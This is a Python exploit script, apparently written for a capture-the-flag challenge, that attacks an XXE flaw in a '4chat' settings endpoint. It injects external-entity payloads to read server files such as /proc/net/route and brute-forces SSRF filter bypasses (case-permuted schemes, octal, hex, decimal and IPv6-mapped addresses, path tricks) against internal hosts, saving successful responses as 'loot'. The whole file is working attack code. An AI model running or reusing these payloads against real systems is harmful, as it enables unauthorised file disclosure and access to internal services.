#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SSRF bypass brute-forcer for the /settings XXE in 4chat.
Tries scheme-case, weird IP notations, path variations, etc.
Marks results that differ from the known "route" placeholder.

Usage examples:
  python ssrf_bypass_scan.py http://62.173.139.193:16002 johh johh
  python ssrf_bypass_scan.py http://62.173.139.193:16002 johh johh --host 172.17.0.1 --ports 1337,8000,16000-16005
  python ssrf_bypass_scan.py http://62.173.139.193:16002 johh johh --single http://172.17.0.1:1337/openapi.json
"""

import os
import re
import sys
import json
import time
import itertools
import argparse
import requests
from urllib.parse import urlparse

# ---------- helpers ----------

def die(msg):
    print(f"[!] {msg}", file=sys.stderr)
    sys.exit(1)

def fetch_csrf_and_login(s, base, user, pwd):
    # cookie/CSRF priming (если нужно)
    try:
        s.get(f"{base}/settings", timeout=10)
    except Exception:
        pass
    # логин через команду
    r = s.post(f"{base}/login", data={"command": f"/login {user} {pwd}"}, timeout=10)
    if r.status_code not in (200, 302):
        die(f"login failed: {r.status_code}")
    return True

def extract_pre(html):
    m = re.search(r"<pre[^>]*>(.*?)</pre>", html, flags=re.S|re.I)
    if m:
        # нормализуем перевод строк
        return re.sub(r"\r?\n", "\n", m.group(1)).strip()
    return html.strip()

def do_xxe_fetch(s, base, target_url_or_file):
    # Минимальный XXE-пэйлоад в xmldata
    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE settings [
<!ENTITY xxe SYSTEM "{target_url_or_file}">
]>
<settings><profession>&xxe;</profession></settings>"""
    data = {
        "profession": "1",
        "xmldata": xml
    }
    r = s.post(f"{base}/settings", data=data, timeout=15)
    text = extract_pre(r.text)
    return text

def ensure_loot_dir():
    os.makedirs("loot", exist_ok=True)

def save_loot(tag, content):
    ensure_loot_dir()
    safe = re.sub(r"[^a-zA-Z0-9._-]+", "_", tag)[:200]
    path = os.path.join("loot", f"{safe}.txt")
    with open(path, "w", encoding="utf-8", errors="ignore") as f:
        f.write(content)
    print(f"[+] saved loot => {path}")

def int_ip(ip):
    a,b,c,d = map(int, ip.split("."))
    return a*(256**3)+b*(256**2)+c*256+d

def zero_padded(ip):
    a,b,c,d = ip.split(".")
    return f"{int(a):03d}.{int(b):03d}.{int(c):03d}.{int(d):03d}"

def octalish(ip):
    a,b,c,d = map(int, ip.split("."))
    return f"0{a:o}.0{b:o}.{c}.{d}"

def ipv6_mapped(ip):
    return f"[::ffff:{ip}]"

def hex_dword(ip):
    return "0x%08X" % int_ip(ip)

def decimals(ip):
    return str(int_ip(ip))

def scheme_permutations(scheme="http"):
    # все 16 вариантов регистра 'http'
    opts = []
    for bits in itertools.product([0,1], repeat=len(scheme)):
        s = "".join(ch.upper() if bit else ch.lower() for ch,bit in zip(scheme, bits))
        opts.append(s)
    return list(dict.fromkeys(opts))

def url_variants(ip, port, path):
    """Генерим кучу вариантов URL для обхода наивных фильтров."""
    host_variants = [
        ip,
        zero_padded(ip),
        octalish(ip),
        decimals(ip),
        hex_dword(ip),
        ipv6_mapped(ip),
    ]
    path_vars = list(dict.fromkeys([
        path,
        f"/./{path.lstrip('/')}",
        f"//{path.lstrip('/')}",
        path.rstrip("/") + "/",
    ]))
    schemes = scheme_permutations("http")

    # добавим ещё double-slash после схемы — иногда ломает наивные startswith-проверки
    for sch, h in itertools.product(schemes, host_variants):
        for p in path_vars:
            # обычный
            yield f"{sch}://{h}:{port}{p}"
            # с двойным слешем
            yield f"{sch}:////{h}:{port}{p}"
            # с userinfo
            yield f"{sch}://user@{h}:{port}{p}"

def parse_ports(s):
    out = []
    for part in s.split(","):
        part = part.strip()
        if "-" in part:
            a,b = part.split("-",1)
            out.extend(range(int(a), int(b)+1))
        else:
            out.append(int(part))
    return sorted(set(out))

def is_blockpage(txt, baseline):
    t = txt.strip()
    # совпадение с baseline (дамп /proc/net/route)
    if t == baseline.strip():
        return True
    # иногда возвращают тот же текст, но с лишними пробелами
    if len(t) == len(baseline) and t.replace(" ","")==baseline.replace(" ",""):
        return True
    # эвристика: выглядит как таблица route
    if "Iface" in t and "Destination" in t and "Gateway" in t and "Mask" in t:
        return True
    return False

# ---------- main ----------

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("base", help="e.g. http://62.173.139.193:16002")
    ap.add_argument("user")
    ap.add_argument("pwd")
    ap.add_argument("--host", default="172.17.0.1")
    ap.add_argument("--ports", default="1337,8000,16000-16005")
    ap.add_argument("--paths", default="/flag,/fl4g,/FLAG,/getflag,/api/flag,/internal/flag,/docs,/redoc,/openapi.json,/env,/health,/status,/metrics,/robots.txt,/")
    ap.add_argument("--single", help="Проверить один URL (без перебора вариантов), например http://172.17.0.1:1337/openapi.json")
    ap.add_argument("--timeout", type=int, default=12)
    args = ap.parse_args()

    base = args.base.rstrip("/")
    s = requests.Session()
    s.headers.update({"User-Agent": "ssrf-bypass/1.0"})

    print("[*] logging in…")
    fetch_csrf_and_login(s, base, args.user, args.pwd)

    print("[*] fetching baseline blockpage (route)…")
    baseline = do_xxe_fetch(s, base, "file:///proc/1/root/proc/net/route")
    print(f"[*] baseline len: {len(baseline)} bytes")

    if args.single:
        print(f"[*] single URL test: {args.single}")
        body = do_xxe_fetch(s, base, args.single)
        print(f"[*] response len: {len(body)}")
        if is_blockpage(body, baseline):
            print("[!] looks like BLOCKED (same as route dump)")
        else:
            print("[+] HIT (content differs from blockpage)!")
            tag = f"single_{args.single.replace('://','_')}"
            save_loot(tag, body)
        return

    host = args.host
    ports = parse_ports(args.ports)
    paths = [p.strip() for p in args.paths.split(",") if p.strip().startswith("/")]

    tested = set()
    hits = 0

    for port in ports:
        for path in paths:
            for u in url_variants(host, port, path):
                if u in tested:
                    continue
                tested.add(u)
                try:
                    body = do_xxe_fetch(s, base, u)
                except requests.RequestException as e:
                    print(f"[-] {u} : {e.__class__.__name__}")
                    continue
                # Быстрый фильтр по длине: блок-страница обычно одинакова
                if is_blockpage(body, baseline):
                    print(f"[.] {u} -> blocked ({len(body)} bytes)")
                    continue
                hits += 1
                print(f"[+] HIT {u} ({len(body)} bytes)")
                save_loot(f"{host}_{port}_{path.strip('/').replace('/','_')}", body)
                # чуть притормозим, чтобы не спамить
                time.sleep(0.2)

    print(f"[*] tested {len(tested)} variants, hits={hits}")

if __name__ == "__main__":
    main()
